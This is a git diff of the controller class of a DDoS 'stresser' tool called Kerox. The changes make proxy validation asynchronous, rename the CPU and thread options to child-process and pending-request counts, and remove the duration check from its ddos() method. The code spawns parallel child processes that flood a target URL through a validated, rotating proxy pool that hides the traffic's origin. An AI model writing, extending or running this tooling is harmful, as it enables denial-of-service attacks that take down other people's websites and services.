@@ -5,7 +5,7 @@ import fs from 'fs';
 
 import 'overpaint.js';
 
-import { getStatic, parseProxies } from "../utils/Utils";
+import { parseProxies } from "../utils/Utils";
 import { PacketType } from "../enums/PacketType";
 import { Status } from "../enums/Status";
 import { Info } from "../enums/Status";
@@ -13,13 +13,13 @@ import { KeroxOptions, StresserOptions } from "../types/Options";
 import { KPacket, Packet } from "../types/Packet";
 import { KProxy } from "../types/Proxy";
 import { Stats } from "./Stats";
-import { DDoSOptions, isDDoSDuration } from "../types/DDoS";
+import { DDoSOptions } from "../types/DDoS";
 import { LogType } from "../enums/LogType";
 import { Log } from "../types/Log";
 import { LogManager } from "./LogManager";
 import { ProgressBar } from "./ProgressBar";
 import { HttpCodeRegistry } from "./HttpCodeRegistry";
-import EventEmitter from "node:events";
+import EventEmitter from "events";
 
 export interface KeroxEvents {
    idle: () => any;
@@ -86,7 +86,7 @@ export class Kerox extends EventEmitter {
       setTimeout(process.exit, 1000);
    }
 
-   private initialize() {
+   private async initialize() {
       this.stats.disable();
       if (this.options.useProxies) {
          if (!this.options.proxyFilePath) {
@@ -96,7 +96,8 @@ export class Kerox extends EventEmitter {
          } else {
             this.proxies = parseProxies(fs.readFileSync(this.options.proxyFilePath, 'utf8').split('\n'));
             if (this.options.validateProxies)
-               this.validateProxies();
+               await this.validateProxies();
+            this._status = [Status.Idle, Info.Unknown];
          }
       } else {
          this._status = [Status.Idle, Info.Unknown];
@@ -201,45 +202,47 @@ export class Kerox extends EventEmitter {
    /**
     * Starts a stresser to validate the proxies and keep only the working ones.
     */
-   private validateProxies(timeout: number = 5000) {
-      if (!this.options.validateProxies) {
-         this.logs._info('Skipping proxy validation.'._dim);
-         return;
-      }
-      // set status
-      this._status = [Status.Busy, Info.ValidatingProxies];
-      this.resetStats();
-      // validate proxies
-      let validator = this.spawn({
-         updateInterval: this.options.updateInterval!,
-         target: 'https://example.com',
-         useProxies: true,
-         proxies: this.proxies,
-         multiplier: 1,
-         threads: 1,
-         agent: undefined,
-         dropRequests: false,
-      });
-      // listen for validation completion
-      validator?.on('message', (packet: KPacket) => {
-         if (packet.type === PacketType.Done) {
-            let rawProxies = getStatic('valid_proxies.txt').split('\n');
-            let validProxies = parseProxies(rawProxies);
-            if (validProxies.length > 0) {
-               this.logs._info(`Found ${validProxies.length} valid proxies`);
-               this.proxies = validProxies;
-            } else {
-               return this.crash('No valid proxies found.');
-            }
-            this._status = [Status.Idle, Info.Unknown];
+   private async validateProxies(timeout: number = 5000) {
+      return new Promise<void>((resolve, reject) => {
+         if (!this.options.validateProxies) {
+            this.logs._info('Skipping proxy validation.'._dim);
+            return resolve();
          }
+         // set status
+         this._status = [Status.Busy, Info.ValidatingProxies];
+         this.resetStats();
+         // validate proxies
+         let validator = this.spawn({
+            updateInterval: this.options.updateInterval!,
+            target: 'https://example.com',
+            useProxies: true,
+            proxies: this.proxies,
+            multiplier: 1,
+            maxPending: 1,
+            agent: undefined,
+            dropRequests: false,
+         });
+         // listen for validation completion
+         validator?.on('message', (packet: KPacket) => {
+            if (packet.type === PacketType.ValidationCompleted) {
+               const validProxies = packet.data;
+               if (validProxies && validProxies.length > 0) {
+                  this.logs._info(`Found ${validProxies.length} valid proxies`);
+                  this.proxies = validProxies;
+                  this._status = [Status.Idle, Info.Unknown];
+                  return resolve();
+               } else {
+                  return this.crash('No valid proxies found.');
+               }
+            }
+         });
+         // start proxy validation
+         let packet = Packet(PacketType.ValidateProxies, {
+            proxies: this.proxies,
+            timeout: timeout
+         });
+         validator.send(packet);
       });
-      // start proxy validation
-      let packet = Packet(PacketType.ValidateProxies, {
-         proxies: this.proxies,
-         timeout: timeout
-      });
-      validator.send(packet);
    }
 
    // ========== Stressers =============================================================================
@@ -304,10 +307,6 @@ export class Kerox extends EventEmitter {
     * @param target The target url
     */
    public ddos(options: DDoSOptions) {
-      this.logs._info(options.target);
-      if (!isDDoSDuration(options.duration))
-         return this.crash('Invalid duration.');
-
       if (this.status === Status.Busy)
          return this.crash(`Kerox is ${this.status}. ${this.info}`);
 
@@ -331,14 +330,14 @@ export class Kerox extends EventEmitter {
       // spawn stressers
       let spawned = 0;
       let completed = 0;
-      for (let i = 0; i < options.CPUs; i++) {
+      for (let i = 0; i < options.childProcesses; i++) {
          const stresser = this.spawn({
             updateInterval: this.options.updateInterval!,
             target: options.target,
             useProxies: this.options.useProxies,
             proxies: this.proxies,
             multiplier: options.multiplier,
-            threads: Math.floor(options.threads / options.CPUs),
+            maxPending: Math.floor(options.maxPending / options.childProcesses),
             agent: options.agent,
             dropRequests: options.dropRequests,
          });
@@ -347,11 +346,11 @@ export class Kerox extends EventEmitter {
             switch (packet.type) {
                case PacketType.Spawned:
                   spawned++;
-                  if (spawned === options.CPUs) onSpawned();
+                  if (spawned === options.childProcesses) onSpawned();
                   break;
                case PacketType.Done:
                   completed++
-                  if (completed === options.CPUs) onCompleted();
+                  if (completed === options.childProcesses) onCompleted();
                   break;
             }
          });
